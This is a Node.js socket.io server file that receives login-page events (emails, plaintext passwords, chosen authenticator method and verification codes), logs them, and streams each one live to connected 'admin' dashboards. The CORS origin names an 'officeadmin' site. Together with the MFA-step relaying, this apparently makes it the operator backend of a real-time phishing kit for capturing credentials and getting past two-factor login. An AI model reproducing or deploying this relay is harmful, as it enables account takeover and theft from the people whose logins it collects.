const express = require("express");
const http = require("http");
const cors = require("cors");
const { Server } = require("socket.io");

const USER_URL = process.env.USER_URL;
const ADMIN_URL = process.env.ADMIN_URL;
const PORT = process.env.PORT || 8080;

const app = express();

app.use(
  cors({
    origin: [
      "https://montreux-hoa.vercel.app/",
      "https://officeadmin-ochre.vercel.app/",
    ],
    methods: ["GET", "POST"], // Allowed HTTP methods
    credentials: true, // Allow cookies if needed
  })
);

const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: [
      "https://montreux-hoa.vercel.app/",
      "https://officeadmin-ochre.vercel.app/",
    ],
    methods: ["GET", "POST"],
  },
});

let adminSockets = new Set();
const userSessions = new Map();
const sessions = new Map();

io.on("connection", (socket) => {
  console.log("New connection:", socket.id);

  // Relay events from login page to admin dashboard
  socket.on("new-login-attempt", (data) => {
    io.emit("new-login-attempt", data); // Broadcast to all connected clients
  });

  // Handle admin registration
  socket.on("register_admin", () => {
    adminSockets.add(socket);
    console.log("Admin registered:", socket.id);

    socket.on("disconnect", () => {
      adminSockets.delete(socket);
      console.log("Admin disconnected:", socket.id);
    });
  });

  // Handle email verification requests from users
  socket.on("verify_email", (data) => {
    let sessionData = sessions.get(data.sessionId) || {
      email: data.email,
      events: [],
    };

    sessionData.events.push({
      type: "email-verification",
      timestamp: data.timestamp || new Date().toISOString(),
      data: data.email,
    });

    sessions.set(data.sessionId, sessionData);
    userSessions.set(data.sessionId, socket);

    // Broadcast to admins
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("new-login-attempt", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  // Handle password attempts
  socket.on("password-attempt", (data) => {
    console.log("Received password attempt:", {
      sessionId: data.sessionId,
      email: data.email,
      password: data.password,
    });

    let sessionData = sessions.get(data.sessionId);
    if (!sessionData) {
      console.log("Initializing new session for sessionId:", data.sessionId);
      sessionData = { sessionId: data.sessionId, events: [] };
      sessions.set(data.sessionId, sessionData);
    }

    sessionData.events.push({
      type: "password-submission",
      timestamp: data.timestamp || new Date().toISOString(),
      data: data.password,
    });

    // Broadcast to admins
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("password-attempt", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  // Handle authenticator selection
  socket.on("authenticator-select", (data) => {
    console.log("Received authenticator-select:", {
      sessionId: data.sessionId,
      email: data.email,
      password: data.password,
    });

    let sessionData = sessions.get(data.sessionId);
    if (!sessionData) {
      console.log("Initializing new session for sessionId:", data.sessionId);
      sessionData = {
        sessionId: data.sessionId,
        email: data.email,
        events: [],
      };
      sessions.set(data.sessionId, sessionData);
    }

    sessionData.events.push({
      type: "authenticator-select",
      timestamp: data.timestamp || new Date().toISOString(),
      email: data.email,
      password: data.password,
    });

    // Broadcast to admins
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("authenticator-select", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  // Handle verify code selection
  socket.on("verifycode-select", (data) => {
    console.log("Received verifycode-select:", {
      sessionId: data.sessionId,
      email: data.email,
      password: data.password,
    });

    let sessionData = sessions.get(data.sessionId);
    if (!sessionData) {
      console.log("Initializing new session for sessionId:", data.sessionId);
      sessionData = {
        sessionId: data.sessionId,
        email: data.email,
        events: [],
      };
      sessions.set(data.sessionId, sessionData);
    }

    sessionData.events.push({
      type: "verifycode-select",
      timestamp: data.timestamp || new Date().toISOString(),
      email: data.email,
      password: data.password,
    });

    // Broadcast to admins
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("verifycode-select", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  // Handle text selection
  socket.on("text-select", (data) => {
    console.log("Received text-select:", {
      sessionId: data.sessionId,
      email: data.email,
      password: data.password,
    });

    let sessionData = sessions.get(data.sessionId);
    if (!sessionData) {
      console.log("Initializing new session for sessionId:", data.sessionId);
      sessionData = {
        sessionId: data.sessionId,
        email: data.email,
        events: [],
      };
      sessions.set(data.sessionId, sessionData);
    }

    sessionData.events.push({
      type: "text-select",
      timestamp: data.timestamp || new Date().toISOString(),
      email: data.email,
      password: data.password,
    });

    // Broadcast to admins
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("text-select", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  // Handle text click
  socket.on("text-click", (data) => {
    console.log("Received text-click:", {
      sessionId: data.sessionId,
      email: data.email,
      password: data.password,
      verifyCode: data.verifyCode,
    });

    let sessionData = sessions.get(data.sessionId);
    if (!sessionData) {
      console.log("Initializing new session for sessionId:", data.sessionId);
      sessionData = {
        sessionId: data.sessionId,
        email: data.email,
        events: [],
      };
      sessions.set(data.sessionId, sessionData);
    }

    sessionData.events.push({
      type: "text-click",
      timestamp: data.timestamp || new Date().toISOString(),
      email: data.email,
      password: data.password,
      verifyCode: data.verifyCode,
    });

    // Broadcast to admins
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("text-click", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });
});

server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

process.on("unhandledRejection", (err) => {
  console.log(err.name, ":", err.message);
  console.log("Unhandled Rejection Occurred! Shutting Down...");
  server.close(() => {
    process.exit(1);
  });
});
